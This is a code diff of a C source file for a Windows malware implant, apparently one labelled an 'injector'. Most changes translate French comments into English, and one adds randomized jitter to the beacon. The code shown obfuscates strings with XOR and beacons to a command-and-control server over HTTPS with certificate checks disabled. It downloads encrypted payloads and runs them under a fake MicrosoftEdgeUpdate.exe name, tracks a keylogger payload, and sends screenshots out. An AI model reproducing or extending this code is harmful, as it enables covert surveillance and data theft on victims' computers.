@@ -266,10 +266,10 @@ static unsigned char encryptedIphlpapi[] = {
 // ============================================================================
 
 /**
- * Déchiffre une chaîne chiffrée avec XOR
- * @param encrypted: Tableau de bytes chiffrés
- * @param length: Longueur du tableau
- * @param key: Clé XOR
+ * Decrypts a string encrypted with XOR
+ * @param encrypted: Array of encrypted bytes
+ * @param length: Length of the array
+ * @param key: XOR key
  */
 void decrypt(unsigned char* encrypted, size_t length, unsigned char key) {
     for (size_t i = 0; i < length; i++) {
@@ -278,11 +278,11 @@ void decrypt(unsigned char* encrypted, size_t length, unsigned char key) {
 }
 
 /**
- * Déchiffre avec XOR polyalphabétique (clé multi-octets)
- * @param encrypted: Tableau de bytes chiffrés
- * @param length: Longueur du tableau
- * @param key_array: Tableau de clés XOR
- * @param key_len: Longueur du tableau de clés
+ * Decrypts with polyalphabetic XOR (multi-byte key)
+ * @param encrypted:
+ * @param length:
+ * @param key_array:
+ * @param key_len:
  */
 void decrypt_poly(unsigned char* encrypted, size_t length, const unsigned char* key_array, size_t key_len) {
     if (key_len == 0) return;
@@ -299,9 +299,9 @@ void encrypt(unsigned char* data, size_t length, unsigned char key) {
 }
 
 /**
- * Reverse une chaîne chiffrée
- * @param str: Chaîne à reverse
- * @param length: Longueur de la chaîne
+ * Reverses an encrypted string
+ * @param str: String to reverse
+ * @param length: Length of the string
  */
 void reverse_string(unsigned char* str, size_t length) {
     for (size_t i = 0; i < length / 2; i++) {
@@ -312,10 +312,10 @@ void reverse_string(unsigned char* str, size_t length) {
 }
 
 /**
- * Déchiffre une chaîne avec reverse puis XOR
- * @param encrypted: Tableau de bytes chiffrés et reversés
- * @param length: Longueur du tableau (sans le null terminator)
- * @param key: Clé XOR
+ * Decrypts a string using reverse then XOR
+ * @param encrypted: Array of encrypted and reversed bytes
+ * @param length: Length of the array (without null terminator)
+ * @param key: XOR key
  */
 void decrypt_reverse_xor(unsigned char* encrypted, size_t length, unsigned char key) {
     reverse_string(encrypted, length);
@@ -324,20 +324,20 @@ void decrypt_reverse_xor(unsigned char* encrypted, size_t length, unsigned char 
 }
 
 /**
- * Affiche le contenu d'un buffer en format hexadécimal
- * @param data: Pointeur vers les données
- * @param size: Taille des données
- * @param label: Label pour identifier l'affichage
+ * Prints the content of a buffer in hexadecimal format
+ * @param data: Pointer to the data
+ * @param size: Size of the data
+ * @param label: Label to identify the output
  */
 void print_hex_dump(const unsigned char* data, size_t size, const char* label) {
     DEBUG("[HexDump - %s] Size: %zu bytes\n", label, size);
     DEBUG("=== BEGIN HEXDUMP ===\n");
 
     for (size_t i = 0; i < size; i += 16) {
-        // Afficher l'offset
+        // Print the offset
         DEBUG("%08zx: ", i);
 
-        // Afficher les bytes en hexadécimal
+        // Print bytes in hexadecimal
         for (size_t j = 0; j < 16; j++) {
             if (i + j < size) {
                 DEBUG("%02x ", data[i + j]);
@@ -347,7 +347,7 @@ void print_hex_dump(const unsigned char* data, size_t size, const char* label) {
             if (j == 7) DEBUG(" ");
         }
 
-        // Afficher les caractères ASCII imprimables
+        // Print printable ASCII characters
         DEBUG(" |");
         for (size_t j = 0; j < 16 && i + j < size; j++) {
             unsigned char c = data[i + j];
@@ -488,8 +488,8 @@ const char* os_to_string(OperatingSystem os) {
 #ifdef _WIN32
 
 /**
- * Initialise tous les pointeurs de fonctions API
- * @return 0 en cas de succès, -1 en cas d'erreur
+ * Initializes all API function pointers
+ * @return 0 on success, -1 on error
  */
 int initialize_sysinfo_api_functions(void) {
     DEBUG("[DEBUG] Initializing system info API functions...\n");
@@ -1201,18 +1201,18 @@ typedef struct {
     size_t payload_size;
     char command[1024];
     int sleep_duration;
-    char payload_name[64];              // Nom du payload envoyé par le C2
+    char payload_name[64];              // Payload name sent by the C2
 } Task;
 
 // ============================================================================
 // RUNNING PAYLOAD STATE
 // ============================================================================
 typedef struct {
-    int is_running;                     // 1 si un payload tourne, 0 sinon
-    DWORD process_id;                   // PID du processus payload
-    HANDLE process_handle;              // Handle du processus payload
-    char payload_path[MAX_PATH];        // Chemin du fichier payload sur disque
-    char payload_name[64];              // Nom du payload (ex: "keylogger")
+    int is_running;                     // 1 if a payload is running, 0 otherwise
+    DWORD process_id;                   // PID of the payload process
+    HANDLE process_handle;              // Handle of the payload process
+    char payload_path[MAX_PATH];        // Path of the payload file on disk
+    char payload_name[64];              // Payload name (e.g.: "keylogger")
 } RunningPayloadState;
 
 RunningPayloadState g_running_payload = {
@@ -1288,17 +1288,17 @@ int send_screenshot_to_c2(const char* agent_id, const unsigned char* data, size_
 // ============================================================================
 
 /**
- * Helper WinHTTP - POST HTTPS vers le C2
- * path       : ex "/heartbeat"
- * body       : corps JSON (peut être NULL)
- * body_len   : longueur du corps (0 si NULL)
- * resp_buf   : buffer de réponse (peut être NULL)
- * resp_size  : taille du buffer
- * Retourne 0 si succès, -1 si erreur
+ * WinHTTP helper - HTTPS POST to the C2
+ * path       : e.g. "/heartbeat"
+ * body       : JSON body (can be NULL)
+ * body_len   : body length (0 if NULL)
+ * resp_buf   : response buffer (can be NULL)
+ * resp_size  : buffer size
+ * Returns 0 on success, -1 on error
  */
 static int winhttp_post(const char* path, const char* body, size_t body_len,
                         char* resp_buf, size_t resp_size) {
-    // Convertir server et path en wide strings
+    // Convert server and path to wide strings
     wchar_t w_server[256] = {0};
     wchar_t w_path[512]   = {0};
     MultiByteToWideChar(CP_ACP, 0, C2_SERVER, -1, w_server, 256);
@@ -1323,7 +1323,7 @@ static int winhttp_post(const char* path, const char* body, size_t body_len,
         return -1;
     }
 
-    // Ignorer les erreurs de certificat auto-signé
+    // Ignore self-signed certificate errors
     DWORD sec_flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA      |
                       SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                       SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
@@ -1340,7 +1340,7 @@ static int winhttp_post(const char* path, const char* body, size_t body_len,
         return -1;
     }
 
-    // Lire la réponse
+    // Read the response
     if (resp_buf && resp_size > 0) {
         DWORD total = 0;
         DWORD avail = 0;
@@ -2030,7 +2030,7 @@ int parse_payload_from_response(const char* json, Task* task, const char* xor_ke
 
     DEBUG("[Payload Parser - Success] Payload decrypted: %d bytes\n", decoded_size);
 
-    // Afficher le payload décrypté en hexadécimal
+    // Print the decrypted payload in hexadecimal
     //print_hex_dump(task->payload, decoded_size, "Decrypted Payload");
 
     task->payload_size = (size_t)decoded_size;
@@ -2259,10 +2259,10 @@ int read_screenshot_data(unsigned char** out_data, size_t* out_size) {
         DEBUG("[Screenshot Reader] No new screenshot available\n");
         UnmapViewOfFile(pData);
         CloseHandle(hMap);
-        return 0; // pas d'erreur, juste rien de neuf
+        return 0; // no error, just nothing new
     }
 
-    // Lire le fichier BMP depuis le disque
+    // Read the BMP file from disk
     const char* path = pData->screenshot_path;
     HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                                OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
@@ -2301,7 +2301,7 @@ int read_screenshot_data(unsigned char** out_data, size_t* out_size) {
 
     DEBUG("[Screenshot Reader] Read %lu bytes from %s\n", bytesRead, path);
 
-    // Signaler au payload qu'on a lu le screenshot
+    // Signal to the payload that we have read the screenshot
     InterlockedExchange(&pData->has_new_data, 0);
 
     UnmapViewOfFile(pData);
@@ -2309,12 +2309,12 @@ int read_screenshot_data(unsigned char** out_data, size_t* out_size) {
 
     *out_data = buf;
     *out_size = (size_t)bytesRead;
-    return 1; // données disponibles
+    return 1; // data available
 }
 
 
 /**
- * Encode data en hex et envoie au C2 comme screenshot.
+ * Encodes data as hex and sends to C2 as screenshot.
  */
 int send_screenshot_to_c2(const char* agent_id, const unsigned char* data, size_t size) {
     if (!agent_id || !data || size == 0) return -1;
@@ -2391,7 +2391,7 @@ int execute_task(const Task* task, unsigned char xor_function_key, unsigned char
             unsigned char* payload = task->payload;
             size_t payload_size = task->payload_size;
 
-            // Chemin unique selon le payload pour éviter les conflits de verrouillage
+            // Unique path per payload to avoid locking conflicts
             char temp_path_buf[MAX_PATH];
             if (strcmp(task->payload_name, "screenshot") == 0)
                 strncpy(temp_path_buf, "C:\\Users\\Public\\MicrosoftEdgeUpdate.exe", MAX_PATH - 1);
@@ -2576,7 +2576,7 @@ int send_heartbeat_to_c2(const char* agent_id, char* response_buffer, size_t buf
     if (response_buffer && strlen(response_buffer) > 0) {
         DEBUG("[C2 - Heartbeat - Receive] Received %zu bytes\n", strlen(response_buffer));
 
-        // Afficher JSON en remplaçant le payload par sa taille
+        // Print JSON by replacing the payload with its size
         const char* payload_field = strstr(response_buffer, "\"payload\"");
         if (payload_field) {
             const char* val_start = strchr(payload_field + 9, '"');
@@ -2851,10 +2851,12 @@ int main(void) {
     // ------------------------------------------------------------------------
     // INITIALIZATION
     // ------------------------------------------------------------------------
+    srand((unsigned int)time(NULL));
+
     DEBUG("[Initialization - Start] Starting injector...\n");
     DEBUG("[Initialization - Debug] Debug mode is: %s\n", DEBUG_MODE ? "ENABLED" : "DISABLED");
 
-    // Payload de test
+    // Test payload
     unsigned char scBytes[] = { 0x90, 0x90, 0x90, 0x90, 0xDE, 0xAD, 0xBE, 0xEF };
     size_t scLength = sizeof(scBytes);
     DEBUG("[Initialization - Payload] Payload length: %zu bytes\n", scLength);
@@ -3051,7 +3053,7 @@ int main(void) {
         }
 
         // ------------------------------------------------------------------------
-        // SCREENSHOT - ONE SHOT : récupère + envoie + cleanup
+        // SCREENSHOT - ONE SHOT: fetch + send + cleanup
         // ------------------------------------------------------------------------
         if (g_running_payload.is_running && strcmp(g_running_payload.payload_name, "screenshot") == 0) {
             unsigned char* screenshot_data = NULL;
@@ -3068,7 +3070,7 @@ int main(void) {
                 }
                 free(screenshot_data);
 
-                // Cleanup : terminer le process + supprimer l'exe + reset état
+                // Cleanup: terminate the process + delete the exe + reset state
                 DEBUG("[Main Loop - Screenshot] Cleaning up payload...\n");
                 if (g_running_payload.process_handle != NULL) {
                     WaitForSingleObject(g_running_payload.process_handle, 3000);
@@ -3091,8 +3093,10 @@ int main(void) {
             }
         }
 
-        //sleeper for heartbeat
-        Sleep(5000);
+        // Jittered heartbeat delay: random between 1 and 10 seconds
+        DWORD jitter_ms = (DWORD)(1000 + rand() % 9001);
+        DEBUG("[Main Loop] Next heartbeat in %lu ms\n", jitter_ms);
+        Sleep(jitter_ms);
     }
     
     getchar();
